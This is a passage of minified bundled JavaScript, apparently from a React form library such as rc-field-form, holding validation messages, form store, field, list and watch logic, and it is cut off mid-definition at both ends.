valid ${type}",eD={default:"Validation error on field '${name}'",required:"'${name}' is required",enum:"'${name}' must be one of [${enum}]",whitespace:"'${name}' cannot be empty",date:{format:"'${name}' is invalid for format date",parse:"'${name}' could not be parsed as date",invalid:"'${name}' is invalid date"},types:{string:eA,method:eA,array:eA,object:eA,number:eA,date:eA,boolean:eA,integer:eA,float:eA,regexp:eA,email:eA,tel:eA,url:eA,hex:eA},string:{len:"'${name}' must be exactly ${len} characters",min:"'${name}' must be at least ${min} characters",max:"'${name}' cannot be longer than ${max} characters",range:"'${name}' must be between ${min} and ${max} characters"},number:{len:"'${name}' must equal ${len}",min:"'${name}' cannot be less than ${min}",max:"'${name}' cannot be greater than ${max}",range:"'${name}' must be between ${min} and ${max}"},array:{len:"'${name}' must be exactly ${len} in length",min:"'${name}' cannot be less than ${min} in length",max:"'${name}' cannot be greater than ${max} in length",range:"'${name}' must be between ${min} and ${max} in length"},pattern:{mismatch:"'${name}' does not match pattern ${pattern}"}};var eL=e.i(19261);let e_="CODE_LOGIC_ERROR";async function eO(e,t,r,o,n){let a={...r};if(delete a.ruleIndex,eM.warning=()=>void 0,a.validator){let e=a.validator;a.validator=(...t)=>{try{return e(...t)}catch(e){return console.error(e),Promise.reject(e_)}}}let s=null;a&&"array"===a.type&&a.defaultField&&(s=a.defaultField,delete a.defaultField);let l=new eM({[e]:[a]}),c=(0,eL.merge)(eD,o.validateMessages);l.messages(c);let u=[];try{await Promise.resolve(l.validate({[e]:t},{...o}))}catch(e){e.errors&&(u=e.errors.map(({message:e},t)=>{let r=e===e_?c.default:e;return i.isValidElement(r)?i.cloneElement(r,{key:`error_${t}`}):r}))}if(!u.length&&s&&Array.isArray(t)&&t.length>0)return(await Promise.all(t.map((t,r)=>eO(`${e}.${r}`,t,s,o,n)))).reduce((e,t)=>[...e,...t],[]);let d={...r,name:e,enum:(r.enum||[]).join(", "),...n};return u.map(e=>{if("string"==typeof e)return e.replace(/\\?\$\{\w+\}/g,e=>e.startsWith("\\")?e.slice(1):d[e.slice(2,-1)]);return e})}async function ej(e){return Promise.all(e).then(e=>[].concat(...e))}async function eF(e){let t=0;return new Promise(r=>{e.forEach(o=>{o.then(o=>{o.errors.length&&r([o]),(t+=1)===e.length&&r([])})})})}var eN=e.i(49643);function eV(e){return G(e)}function eB(e,t){let r={};return t.forEach(t=>{let o=(0,eN.default)(e,t);r=(0,eL.default)(r,t,o)}),r}function eH(e,t,r=!1){return e&&e.some(e=>ez(t,e,r))}function ez(e,t,r=!1){return!!e&&!!t&&(!!r||e.length===t.length)&&t.every((t,r)=>e[r]===t)}function eU(e,t,r){let{length:o}=e;if(t<0||t>=o||r<0||r>=o)return e;let n=e[t],a=t-r;return a>0?[...e.slice(0,r),n,...e.slice(r,t),...e.slice(t+1,o)]:a<0?[...e.slice(0,t),...e.slice(t+1,r+1),n,...e.slice(r+1,o)]:e}var eW=eN;let eq=e=>{let t=new MessageChannel;t.port1.onmessage=e,t.port2.postMessage(null)};class eG{namePathList=[];taskId=0;watcherList=new Set;form;constructor(e){this.form=e}register(e){return this.watcherList.add(e),()=>{this.watcherList.delete(e)}}notify(e){e.forEach(e=>{this.namePathList.every(t=>!ez(t,e))&&this.namePathList.push(e)}),this.doBatch()}doBatch(){this.taskId+=1;let e=this.taskId;eq(()=>{if(e===this.taskId&&this.watcherList.size){let e=this.form.getForm(),t=e.getFieldsValue(),r=e.getFieldsValue(!0);this.watcherList.forEach(e=>{e(t,r,this.namePathList)}),this.namePathList=[]}})}}var eJ=e.i(37434);async function eX(){return new Promise(e=>{eq(()=>{(0,eJ.default)(()=>{e()})})})}function eK(){return(eK=Object.assign.bind()).apply(this,arguments)}let eQ=[],eY=[];function eZ(e,t,r,o,n,a){return"function"==typeof e?e(t,r,"source"in a?{source:a.source}:{}):o!==n}class e0 extends H.Component{static contextType=W;state={resetCount:0};cancelRegisterFunc=null;mounted=!1;touched=!1;dirty=!1;validatePromise;prevValidating;errors=eQ;warnings=eY;constructor(e){if(super(e),e.fieldContext){const{getInternalHooks:t}=e.fieldContext,{initEntityValue:r}=t(z);r(this)}}componentDidMount(){let{shouldUpdate:e,fieldContext:t}=this.props;if(this.mounted=!0,t){let{getInternalHooks:e}=t,{registerField:r}=e(z);this.cancelRegisterFunc=r(this)}!0===e&&this.reRender()}componentWillUnmount(){this.cancelRegister(),this.triggerMetaEvent(!0),this.mounted=!1}cancelRegister=()=>{let{preserve:e,isListField:t,name:r}=this.props;this.cancelRegisterFunc&&this.cancelRegisterFunc(t,e,eV(r)),this.cancelRegisterFunc=null};getNamePath=()=>{let{name:e,fieldContext:t}=this.props,{prefixName:r=[]}=t;return void 0!==e?[...r,...e]:[]};getRules=()=>{let{rules:e=[],fieldContext:t}=this.props;return e.map(e=>"function"==typeof e?e(t):e)};reRender(){this.mounted&&this.forceUpdate()}refresh=()=>{this.mounted&&this.setState(({resetCount:e})=>({resetCount:e+1}))};metaCache=null;triggerMetaEvent=e=>{let{onMetaChange:t}=this.props;if(t){let r={...this.getMeta(),destroy:e};(0,V.default)(this.metaCache,r)||t(r),this.metaCache=r}else this.metaCache=null};onStoreChange=(e,t,r)=>{let{shouldUpdate:o,dependencies:n=[],onReset:a}=this.props,{store:i}=r,s=this.getNamePath(),l=this.getValue(e),c=this.getValue(i),u=t&&eH(t,s);switch("valueUpdate"===r.type&&"external"===r.source&&!(0,V.default)(l,c)&&(this.touched=!0,this.dirty=!0,this.validatePromise=null,this.errors=eQ,this.warnings=eY,this.triggerMetaEvent()),r.type){case"reset":if(!t||u){this.touched=!1,this.dirty=!1,this.validatePromise=void 0,this.errors=eQ,this.warnings=eY,this.triggerMetaEvent(),a?.(),this.refresh();return}break;case"remove":if(o&&eZ(o,e,i,l,c,r))return void this.reRender();break;case"setField":{let{data:n}=r;if(u){"touched"in n&&(this.touched=n.touched),"validating"in n&&!("originRCField"in n)&&(this.validatePromise=n.validating?Promise.resolve([]):null),"errors"in n&&(this.errors=n.errors||eQ),"warnings"in n&&(this.warnings=n.warnings||eY),this.dirty=!0,this.triggerMetaEvent(),this.reRender();return}if("value"in n&&eH(t,s,!0)||o&&!s.length&&eZ(o,e,i,l,c,r))return void this.reRender();break}case"dependenciesUpdate":if(n.map(eV).some(e=>eH(r.relatedFields,e)))return void this.reRender();break;default:if(u||(!n.length||s.length||o)&&eZ(o,e,i,l,c,r))return void this.reRender()}!0===o&&this.reRender()};validateRules=e=>{let t=this.getNamePath(),r=this.getValue(),{triggerName:o,validateOnly:n=!1,delayFrame:a}=e||{},i=Promise.resolve().then(async()=>{if(!this.mounted)return[];let{validateFirst:n=!1,messageVariables:s,validateDebounce:l}=this.props;a&&await eX();let c=this.getRules();if(o&&(c=c.filter(e=>e).filter(e=>{let{validateTrigger:t}=e;return!t||G(t).includes(o)})),l&&o&&(await new Promise(e=>{setTimeout(e,l)}),this.validatePromise!==i))return[];let u=function(e,t,r,o,n,a){let i,s=e.join("."),l=r.map((e,t)=>{let r=e.validator,o={...e,ruleIndex:t};return r&&(o.validator=(e,t,o)=>{let n=!1,a=r(e,t,(...e)=>{Promise.resolve().then(()=>{(0,B.default)(!n,"Your validator function has already return a promise. `callback` will be ignored."),n||o(...e)})});n=a&&"function"==typeof a.then&&"function"==typeof a.catch,(0,B.default)(n,"`callback` is deprecated. Please return a promise instead."),n&&a.then(()=>{o()}).catch(e=>{o(e||" ")})}),o}).sort(({warningOnly:e,ruleIndex:t},{warningOnly:r,ruleIndex:o})=>!!e==!!r?t-o:e?1:-1);if(!0===n)i=new Promise(async(e,r)=>{for(let e=0;e<l.length;e+=1){let n=l[e],i=await eO(s,t,n,o,a);if(i.length)return void r([{errors:i,rule:n}])}e([])});else{let e=l.map(e=>eO(s,t,e,o,a).then(t=>({errors:t,rule:e})));i=(n?eF(e):ej(e)).then(e=>Promise.reject(e))}return i.catch(e=>e),i}(t,r,c,e,n,s);return u.catch(e=>e).then((e=eQ)=>{if(this.validatePromise===i){this.validatePromise=null;let t=[],r=[];e.forEach?.(({rule:{warningOnly:e},errors:o=eQ})=>{e?r.push(...o):t.push(...o)}),this.errors=t,this.warnings=r,this.triggerMetaEvent(),this.reRender()}}),u});return n||(this.validatePromise=i,this.dirty=!0,this.errors=eQ,this.warnings=eY,this.triggerMetaEvent(),this.reRender()),i};isFieldValidating=()=>!!this.validatePromise;isFieldTouched=()=>this.touched;isFieldDirty=()=>{if(this.dirty||void 0!==this.props.initialValue)return!0;let{fieldContext:e}=this.props,{getInitialValue:t}=e.getInternalHooks(z);return void 0!==t(this.getNamePath())};getErrors=()=>this.errors;getWarnings=()=>this.warnings;isListField=()=>this.props.isListField;isList=()=>this.props.isList;isPreserve=()=>this.props.preserve;getMeta=()=>(this.prevValidating=this.isFieldValidating(),{touched:this.isFieldTouched(),validating:this.prevValidating,errors:this.errors,warnings:this.warnings,name:this.getNamePath(),validated:null===this.validatePromise});getOnlyChild=e=>{if("function"==typeof e){let t=this.getMeta();return{...this.getOnlyChild(e(this.getControlled(),t,this.props.fieldContext)),isFunction:!0}}let t=(0,N.default)(e);return 1===t.length&&H.isValidElement(t[0])?{child:t[0],isFunction:!1}:{child:t,isFunction:!1}};getValue=e=>{let{getFieldsValue:t}=this.props.fieldContext,r=this.getNamePath();return(0,eW.default)(e||t(!0),r)};getControlled=(e={})=>{let{name:t,trigger:r="onChange",validateTrigger:o,getValueFromEvent:n,normalize:a,valuePropName:i="value",getValueProps:s,fieldContext:l}=this.props,c=void 0!==o?o:l.validateTrigger,u=this.getNamePath(),{getInternalHooks:d,getFieldsValue:p}=l,{dispatch:m}=d(z),f=this.getValue(),g=s||(e=>({[i]:e})),h=e[r],v=void 0!==t?g(f):{},b={...e,...v};return b[r]=(...e)=>{let t;this.touched=!0,this.dirty=!0,this.triggerMetaEvent(),t=n?n(...e):function(e,...t){let r=t[0];return r&&r.target&&"object"==typeof r.target&&e in r.target?r.target[e]:r}(i,...e),a&&(t=a(t,f,p(!0))),t!==f&&m({type:"updateValue",namePath:u,value:t}),h&&h(...e)},G(c||[]).forEach(e=>{let t=b[e];b[e]=(...r)=>{t&&t(...r);let{rules:o}=this.props;o&&o.length&&m({type:"validateField",namePath:u,triggerName:e})}}),b};render(){let e,{resetCount:t}=this.state,{children:r}=this.props,{child:o,isFunction:n}=this.getOnlyChild(r);return n?e=o:H.isValidElement(o)?e=H.cloneElement(o,this.getControlled(o.props)):((0,B.default)(!o,"`children` of Field is not validate ReactElement."),e=o),H.createElement(H.Fragment,{key:t},e)}}let e1=function({name:e,...t}){let r=H.useContext(W),o=H.useContext(q),n=void 0!==e?eV(e):void 0,a=t.isListField??!!o,i="keep";return a||(i=`_${(n||[]).join("_")}`),H.createElement(e0,eK({key:i,name:n,isListField:a},t,{fieldContext:r}))},e2="__@field_split__";function e3(e){return e.map(e=>`${typeof e}:${e}`).join(e2)}class e4{kvs=new Map;set(e,t){this.kvs.set(e3(e),t)}get(e){return this.kvs.get(e3(e))}getAsPrefix(e){let t=e3(e),r=t+e2,o=[],n=this.kvs.get(t);return void 0!==n&&o.push(n),this.kvs.forEach((e,t)=>{t.startsWith(r)&&o.push(e)}),o}update(e,t){let r=t(this.get(e));r?this.set(e,r):this.delete(e)}delete(e){this.kvs.delete(e3(e))}map(e){return[...this.kvs.entries()].map(([t,r])=>e({key:t.split(e2).map(e=>{let[,t,r]=e.match(/^([^:]*):(.*)$/);return"number"===t?Number(r):r}),value:r}))}toJSON(){let e={};return this.map(({key:t,value:r})=>(e[t.join(".")]=r,null)),e}}var eW=eN;class e6{formHooked=!1;forceRootUpdate;subscribable=!0;store={};fieldEntities=[];initialValues={};callbacks={};validateMessages=null;preserve=null;lastValidatePromise=null;watcherCenter=new eG(this);constructor(e){this.forceRootUpdate=e}getForm=()=>({getFieldValue:this.getFieldValue,getFieldsValue:this.getFieldsValue,getFieldError:this.getFieldError,getFieldWarning:this.getFieldWarning,getFieldsError:this.getFieldsError,isFieldsTouched:this.isFieldsTouched,isFieldTouched:this.isFieldTouched,isFieldValidating:this.isFieldValidating,isFieldsValidating:this.isFieldsValidating,resetFields:this.resetFields,setFields:this.setFields,setFieldValue:this.setFieldValue,setFieldsValue:this.setFieldsValue,validateFields:this.validateFields,submit:this.submit,_init:!0,getInternalHooks:this.getInternalHooks});getInternalHooks=e=>e===z?(this.formHooked=!0,{dispatch:this.dispatch,initEntityValue:this.initEntityValue,registerField:this.registerField,useSubscribe:this.useSubscribe,setInitialValues:this.setInitialValues,destroyForm:this.destroyForm,setCallbacks:this.setCallbacks,setValidateMessages:this.setValidateMessages,getFields:this.getFields,setPreserve:this.setPreserve,getInitialValue:this.getInitialValue,registerWatch:this.registerWatch}):((0,B.default)(!1,"`getInternalHooks` is internal usage. Should not call directly."),null);useSubscribe=e=>{this.subscribable=e};prevWithoutPreserves=null;setInitialValues=(e,t)=>{if(this.initialValues=e||{},t){let t=(0,eL.merge)(e,this.store);this.prevWithoutPreserves?.map(({key:r})=>{t=(0,eL.default)(t,r,(0,eW.default)(e,r))}),this.prevWithoutPreserves=null,this.updateStore(t)}};destroyForm=e=>{if(e)this.updateStore({});else{let e=new e4;this.getFieldEntities(!0).forEach(t=>{this.isMergedPreserve(t.isPreserve())||e.set(t.getNamePath(),!0)}),this.prevWithoutPreserves=e}};getInitialValue=e=>{let t=(0,eW.default)(this.initialValues,e);return e.length?(0,eL.merge)(t):t};setCallbacks=e=>{this.callbacks=e};setValidateMessages=e=>{this.validateMessages=e};setPreserve=e=>{this.preserve=e};registerWatch=e=>this.watcherCenter.register(e);notifyWatch=(e=[])=>{this.watcherCenter.notify(e)};timeoutId=null;warningUnhooked=()=>{};updateStore=e=>{this.store=e};getFieldEntities=(e=!1)=>e?this.fieldEntities.filter(e=>e.getNamePath().length):this.fieldEntities;getFieldsMap=(e=!1)=>{let t=new e4;return this.getFieldEntities(e).forEach(e=>{let r=e.getNamePath();t.set(r,e)}),t};getFieldEntitiesForNamePathList=(e,t=!1)=>{if(!e)return this.getFieldEntities(!0);let r=this.getFieldsMap(!0);return t?e.flatMap(e=>{let t=eV(e),o=r.getAsPrefix(t);return o.length?o:[{INVALIDATE_NAME_PATH:t}]}):e.map(e=>{let t=eV(e);return r.get(t)||{INVALIDATE_NAME_PATH:eV(e)}})};getFieldsValue=(e,t)=>{let r,o;if(this.warningUnhooked(),!0===e||Array.isArray(e)?(r=e,o=t):e&&"object"==typeof e&&(o=e.filter),!0===r&&!o)return this.store;let n=this.getFieldEntitiesForNamePathList(Array.isArray(r)?r:null,!0),a=[],i=[];n.forEach(e=>{let t=e.INVALIDATE_NAME_PATH||e.getNamePath();if(e.isList?.())return void i.push(t);if(o){let r="getMeta"in e?e.getMeta():null;o(r)&&a.push(t)}else a.push(t)});let s=eB(this.store,a.map(eV));return i.forEach(e=>{(0,eW.default)(s,e)||(s=(0,eL.default)(s,e,[]))}),s};getFieldValue=e=>{this.warningUnhooked();let t=eV(e);return(0,eW.default)(this.store,t)};getFieldsError=e=>(this.warningUnhooked(),this.getFieldEntitiesForNamePathList(e).map((t,r)=>t&&!t.INVALIDATE_NAME_PATH?{name:t.getNamePath(),errors:t.getErrors(),warnings:t.getWarnings()}:{name:eV(e[r]),errors:[],warnings:[]}));getFieldError=e=>{this.warningUnhooked();let t=eV(e);return this.getFieldsError([t])[0].errors};getFieldWarning=e=>{this.warningUnhooked();let t=eV(e);return this.getFieldsError([t])[0].warnings};isFieldsTouched=(...e)=>{let t;this.warningUnhooked();let[r,o]=e,n=!1;0===e.length?t=null:1===e.length?Array.isArray(r)?(t=r.map(eV),n=!1):(t=null,n=r):(t=r.map(eV),n=o);let a=this.getFieldEntities(!0),i=e=>e.isFieldTouched();if(!t)return n?a.every(e=>i(e)||e.isList()):a.some(i);let s=new e4;t.forEach(e=>{s.set(e,[])}),a.forEach(e=>{let r=e.getNamePath();t.forEach(t=>{t.every((e,t)=>r[t]===e)&&s.update(t,t=>[...t,e])})});let l=e=>e.some(i),c=s.map(({value:e})=>e);return n?c.every(l):c.some(l)};isFieldTouched=e=>(this.warningUnhooked(),this.isFieldsTouched([e]));isFieldsValidating=e=>{this.warningUnhooked();let t=this.getFieldEntities();if(!e)return t.some(e=>e.isFieldValidating());let r=e.map(eV);return t.some(e=>eH(r,e.getNamePath())&&e.isFieldValidating())};isFieldValidating=e=>(this.warningUnhooked(),this.isFieldsValidating([e]));resetWithFieldInitialValue=(e={})=>{let t,r=new e4,o=this.getFieldEntities(!0);o.forEach(e=>{let{initialValue:t}=e.props,o=e.getNamePath();if(void 0!==t){let n=r.get(o)||new Set;n.add({entity:e,value:t}),r.set(o,n)}});let n=t=>{t.forEach(t=>{let{initialValue:o}=t.props;if(void 0!==o){let o=t.getNamePath();if(void 0!==this.getInitialValue(o))(0,B.default)(!1,`Form already set 'initialValues' with path '${o.join(".")}'. Field can not overwrite it.`);else{let n=r.get(o);if(n&&n.size>1)(0,B.default)(!1,`Multiple Field with path '${o.join(".")}' set 'initialValue'. Can not decide which one to pick.`);else if(n){let r=this.getFieldValue(o);t.isListField()||e.skipExist&&void 0!==r||this.updateStore((0,eL.default)(this.store,o,[...n][0].value))}}}})};e.entities?t=e.entities:e.namePathList?(t=[],e.namePathList.forEach(e=>{let o=r.get(e);o&&t.push(...[...o].map(e=>e.entity))})):t=o,n(t)};resetFields=e=>{this.warningUnhooked();let t=this.store;if(!e){this.updateStore((0,eL.merge)(this.initialValues)),this.resetWithFieldInitialValue(),this.notifyObservers(t,null,{type:"reset"}),this.notifyWatch();return}let r=e.map(eV);r.forEach(e=>{let t=this.getInitialValue(e);this.updateStore((0,eL.default)(this.store,e,t))}),this.resetWithFieldInitialValue({namePathList:r}),this.notifyObservers(t,r,{type:"reset"}),this.notifyWatch(r)};setFields=e=>{this.warningUnhooked();let t=this.store,r=[];e.forEach(e=>{let{name:o,...n}=e,a=eV(o);r.push(a),"value"in n&&this.updateStore((0,eL.default)(this.store,a,n.value)),this.notifyObservers(t,[a],{type:"setField",data:e})}),this.notifyWatch(r)};getFields=()=>this.getFieldEntities(!0).map(e=>{let t=e.getNamePath(),r={...e.getMeta(),name:t,value:this.getFieldValue(t)};return Object.defineProperty(r,"originRCField",{value:!0}),r});initEntityValue=e=>{let{initialValue:t}=e.props;if(void 0!==t){let r=e.getNamePath();void 0===(0,eW.default)(this.store,r)&&this.updateStore((0,eL.default)(this.store,r,t))}};isMergedPreserve=e=>(void 0!==e?e:this.preserve)??!0;registerField=e=>{this.fieldEntities.push(e);let t=e.getNamePath();if(this.notifyWatch([t]),void 0!==e.props.initialValue){let t=this.store;this.resetWithFieldInitialValue({entities:[e],skipExist:!0}),this.notifyObservers(t,[e.getNamePath()],{type:"valueUpdate",source:"internal"})}return(r,o,n=[])=>{if(this.fieldEntities=this.fieldEntities.filter(t=>t!==e),!this.isMergedPreserve(o)&&(!r||n.length>1)){let e=r?void 0:this.getInitialValue(t);if(t.length&&this.getFieldValue(t)!==e&&this.fieldEntities.every(e=>!ez(e.getNamePath(),t))){let r=this.store;this.updateStore((0,eL.default)(r,t,e,!0)),this.notifyObservers(r,[t],{type:"remove"}),this.triggerDependenciesUpdate(r,t)}}this.notifyWatch([t])}};dispatch=e=>{switch(e.type){case"updateValue":{let{namePath:t,value:r}=e;this.updateValue(t,r);break}case"validateField":{let{namePath:t,triggerName:r}=e;this.validateFields([t],{triggerName:r})}}};notifyObservers=(e,t,r)=>{if(this.subscribable){let o={...r,store:this.getFieldsValue(!0)};this.getFieldEntities().forEach(({onStoreChange:r})=>{r(e,t,o)})}else this.forceRootUpdate()};triggerDependenciesUpdate=(e,t)=>{let r=this.getDependencyChildrenFields(t);return r.length&&this.validateFields(r,{delayFrame:!0}),this.notifyObservers(e,r,{type:"dependenciesUpdate",relatedFields:[t,...r]}),r};updateValue=(e,t)=>{let r=eV(e),o=this.store;this.updateStore((0,eL.default)(this.store,r,t)),this.notifyObservers(o,[r],{type:"valueUpdate",source:"internal"}),this.notifyWatch([r]);let n=this.triggerDependenciesUpdate(o,r),{onValuesChange:a}=this.callbacks;if(a){let e=this.getFieldsMap(!0).get(r),t=eB(this.store,[r]),o=this.getFieldsValue(),n=(0,eL.mergeWith)([o,t],{prepareArray:t=>e?.isList()?[]:[...t||[]]});a(t,n)}this.triggerOnFieldsChange([r,...n])};setFieldsValue=e=>{this.warningUnhooked();let t=this.store;if(e){let t=(0,eL.merge)(this.store,e);this.updateStore(t)}this.notifyObservers(t,null,{type:"valueUpdate",source:"external"}),this.notifyWatch()};setFieldValue=(e,t)=>{this.setFields([{name:e,value:t,errors:[],warnings:[],touched:!0}])};getDependencyChildrenFields=e=>{let t=new Set,r=[],o=new e4;this.getFieldEntities().forEach(e=>{let{dependencies:t}=e.props;(t||[]).forEach(t=>{let r=eV(t);o.update(r,(t=new Set)=>(t.add(e),t))})});let n=e=>{(o.get(e)||new Set).forEach(e=>{if(!t.has(e)){t.add(e);let o=e.getNamePath();e.isFieldDirty()&&o.length&&(r.push(o),n(o))}})};return n(e),r};triggerOnFieldsChange=(e,t)=>{let{onFieldsChange:r}=this.callbacks;if(r){let o=this.getFields();if(t){let e=new e4;t.forEach(({name:t,errors:r})=>{e.set(t,r)}),o.forEach(t=>{t.errors=e.get(t.name)||t.errors})}let n=o.filter(({name:t})=>eH(e,t));n.length&&r(n,o)}};validateFields=(e,t)=>{let r,o,n,a,i;this.warningUnhooked(),Array.isArray(e)||"string"==typeof e||"string"==typeof t?(r=e,o=t):o=e;let s=!!r,l=s?r.map(eV):[],c=[...l],u=[],d=String(Date.now()),p=new Set,{recursive:m,dirty:f}=o||{};this.getFieldEntities(!0).forEach(e=>{let t=e.getNamePath();if((s||(e.isList()&&l.some(e=>ez(e,t,!0))||c.push(t),l.push(t)),e.props.rules&&e.props.rules.length)&&(!f||e.isFieldDirty())&&(p.add(t.join(d)),!s||eH(l,t,m))){let r=e.validateRules({validateMessages:{...eD,...this.validateMessages},...o});u.push(r.then(()=>({name:t,errors:[],warnings:[]})).catch(e=>{let r=[],o=[];return(e.forEach?.(({rule:{warningOnly:e},errors:t})=>{e?o.push(...t):r.push(...t)}),r.length)?Promise.reject({name:t,errors:r,warnings:o}):{name:t,errors:r,warnings:o}}))}});let g=(n=!1,a=u.length,i=[],u.length?new Promise((e,t)=>{u.forEach((r,o)=>{r.catch(e=>(n=!0,e)).then(r=>{a-=1,i[o]=r,a>0||(n&&t(i),e(i))})})}):Promise.resolve([]));this.lastValidatePromise=g,g.catch(e=>e).then(e=>{let t=e.map(({name:e})=>e);this.notifyObservers(this.store,t,{type:"validateFinish"}),this.triggerOnFieldsChange(t,e)});let h=g.then(()=>this.lastValidatePromise===g?Promise.resolve(this.getFieldsValue(c)):Promise.reject([])).catch(e=>{let t=e.filter(e=>e&&e.errors.length);return Promise.reject({message:t[0]?.errors?.[0],values:this.getFieldsValue(l),errorFields:t,outOfDate:this.lastValidatePromise!==g})});h.catch(e=>e);let v=l.filter(e=>p.has(e.join(d)));return this.triggerOnFieldsChange(v),h};submit=()=>{this.warningUnhooked(),this.validateFields().then(e=>{let{onFinish:t}=this.callbacks;if(t)try{t(e)}catch(e){console.error(e)}}).catch(e=>{let{onFinishFailed:t}=this.callbacks;t&&t(e)})}}let e5=function(e){let t=i.useRef(null),[,r]=i.useState({});return t.current||(e?t.current=e:t.current=new e6(()=>{r({})}).getForm()),[t.current]},e8=i.createContext({triggerFormChange:()=>{},triggerFormFinish:()=>{},registerForm:()=>{},unregisterForm:()=>{}});function e7(){return(e7=Object.assign.bind()).apply(this,arguments)}var eW=eN,e9=e.i(80251);function te(e){try{return JSON.stringify(e)}catch{return Math.random()}}let tt=i.forwardRef(({name:e,initialValues:t,fields:r,form:o,preserve:n,children:a,component:s="form",validateMessages:l,validateTrigger:c="onChange",onValuesChange:u,onFieldsChange:d,onFinish:p,onFinishFailed:m,clearOnDestroy:f,...g},h)=>{let v,b=i.useRef(null),y=i.useContext(e8),[S]=e5(o),{useSubscribe:x,setInitialValues:C,setCallbacks:w,setValidateMessages:k,setPreserve:P,destroyForm:$}=S.getInternalHooks(z);i.useImperativeHandle(h,()=>({...S,nativeElement:b.current})),i.useEffect(()=>(y.registerForm(e,S),()=>{y.unregisterForm(e)}),[y,S,e]),k({...y.validateMessages,...l}),w({onValuesChange:u,onFieldsChange:(t,...r)=>{y.triggerFormChange(e,t),d&&d(t,...r)},onFinish:t=>{y.triggerFormFinish(e,t),p&&p(t)},onFinishFailed:m}),P(n);let E=i.useRef(null);C(t,!E.current),E.current||(E.current=!0),i.useEffect(()=>()=>$(f),[]);let T="function"==typeof a;v=T?a(S.getFieldsValue(!0),S):a,x(!T);let I=i.useRef(null);i.useEffect(()=>{var e,t;e=I.current||[],e===(t=r||[])||(e||!t)&&(!e||t)&&e&&t&&"object"==typeof e&&"object"==typeof t&&[...new Set([...Object.keys(e),...Object.keys(t)])].every(r=>{let o=e[r],n=t[r];return"function"==typeof o&&"function"==typeof n||o===n})||S.setFields(r||[]),I.current=r},[r,S]);let R=i.useMemo(()=>({...S,validateTrigger:c}),[S,c]),M=i.createElement(q.Provider,{value:null},i.createElement(W.Provider,{value:R},v));return!1===s?M:i.createElement(s,e7({},g,{ref:b,onSubmit:e=>{e.preventDefault(),e.stopPropagation(),S.submit()},onReset:e=>{e.preventDefault(),S.resetFields(),g.onReset?.(e)}}),M)});tt.FormProvider=({validateMessages:e,onFormChange:t,onFormFinish:r,children:o})=>{let n=i.useContext(e8),a=i.useRef({});return i.createElement(e8.Provider,{value:{...n,validateMessages:{...n.validateMessages,...e},triggerFormChange:(e,r)=>{t&&t(e,{changedFields:r,forms:a.current}),n.triggerFormChange(e,r)},triggerFormFinish:(e,t)=>{r&&r(e,{values:t,forms:a.current}),n.triggerFormFinish(e,t)},registerForm:(e,t)=>{e&&(a.current={...a.current,[e]:t}),n.registerForm(e,t)},unregisterForm:e=>{let t={...a.current};delete t[e],a.current=t,n.unregisterForm(e)}}},o)},tt.Field=e1,tt.List=function({name:e,initialValue:t,children:r,rules:o,validateTrigger:n,isListField:a}){let s=i.useContext(W),l=i.useContext(q),c=i.useRef({keys:[],id:0}).current,u=i.useMemo(()=>[...eV(s.prefixName)||[],...eV(e)],[s.prefixName,e]),d=i.useMemo(()=>({...s,prefixName:u}),[s,u]),p=i.useMemo(()=>({getKey:e=>{let t=u.length,r=e[t];return[c.keys[r],e.slice(t+1)]}}),[c,u]);return"function"!=typeof r?((0,B.default)(!1,"Form.List only accepts function as children."),null):i.createElement(q.Provider,{value:p},i.createElement(W.Provider,{value:d},i.createElement(e1,{name:[],shouldUpdate:(e,t,{source:r})=>"internal"!==r&&e!==t,rules:o,validateTrigger:n,initialValue:t,isList:!0,isListField:a??!!l},({value:e=[],onChange:t},o)=>{let{getFieldValue:n}=s,a=()=>n(u||[])||[],i=e||[];return Array.isArray(i)||(i=[]),r(i.map((e,t)=>{let r=c.keys[t];return void 0===r&&(c.keys[t]=c.id,r=c.keys[t],c.id+=1),{name:t,key:r,isListField:!0}}),{add:(e,r)=>{let o=a();r>=0&&r<=o.length?(c.keys=[...c.keys.slice(0,r),c.id,...c.keys.slice(r)],t([...o.slice(0,r),e,...o.slice(r)])):(c.keys=[...c.keys,c.id],t([...o,e])),c.id+=1},remove:e=>{let r=a(),o=new Set(Array.isArray(e)?e:[e]);o.size<=0||(c.keys=c.keys.filter((e,t)=>!o.has(t)),t(r.filter((e,t)=>!o.has(t))))},move(e,r){if(e===r)return;let o=a();e<0||e>=o.length||r<0||r>=o.length||(c.keys=eU(c.keys,e,r),t(eU(o,e,r)))}},o)})))},tt.useForm=e5,tt.useWatch=function(...e){let[t,r={}]=e,o=r&&r._init?{form:r}:r,n=o.form,[a,s]=(0,i.useState)(()=>"function"==typeof t?t({}):void 0),l=(0,i.useMemo)(()=>te(a),[a]);(0,i.useRef)(l).current=l;let c=(0,i.useContext)(W),u=n||c,d=u&&u._init,{getFieldsValue:p,getInternalHooks:m}=u,{registerWatch:f}=m(z),g=(0,e9.useEvent)((e,r)=>{let n=o.preserve?r??p(!0):e??p(),i="function"==typeof t?t(n):(0,eW.default)(n,eV(t));te(a)!==te(i)&&s(i)}),h="function"==typeof t?t:JSON.stringify(t);return(0,i.useEffect)(()=>{d&&g()},[d,h]),(0,i.useEffect)(()=>{if(d)return f((e,t)=>{g(e,t)})},[d]),a};let tr=i.createContext({}),to=i.createContext(void 0);e.s(["FormItemInputContext",0,tr,"NoFormStyle",0,({children:e,status:t,override:r})=>{let o=i.useContext(tr),n=i.useMemo(()=>{let e={...o};return r&&delete e.isFormItemInput,t&&(delete e.status,delete e.hasFeedback,delete e.feedbackIcon),e},[t,r,o]);return i.createElement(tr.Provider,{value:n},e)},"VariantContext",0,to],62139);let tn=(e,t,r)=>{let o,{variant:n,[e]:a}=i.useContext(c.ConfigContext),s=i.useContext(to),l=a?.variant;o=void 0!==t?t:!1===r?"borderless":s??l??n??"outlined";let u=c.Variants.includes(o);return[o,u]};e.s(["default",0,tn],92812);let ta=e=>{let{prefixCls:t,className:r,style:o,size:n,shape:a}=e,s=(0,l.clsx)({[`${t}-lg`]:"large"===n,[`${t}-sm`]:"small"===n}),c=(0,l.clsx)({[`${t}-circle`]:"circle"===a,[`${t}-square`]:"square"===a,[`${t}-round`]:"round"===a}),u=i.useMemo(()=>"number"==typeof n?{width:n,height:n,lineHeight:`${n}px`}:{},[n]);return i.createElement("span",{className:(0,l.clsx)(t,s,c,r),style:{...u,...o}})};var ti=e.i(17813);e.s(["Keyframes",()=>ti.default],94758);var ti=ti,ts=e.i(38378);let tl=new ti.default("ant-skeleton-loading",{"0%":{backgroundPosition:"100% 50%"},"100%":{backgroundPosition:"0 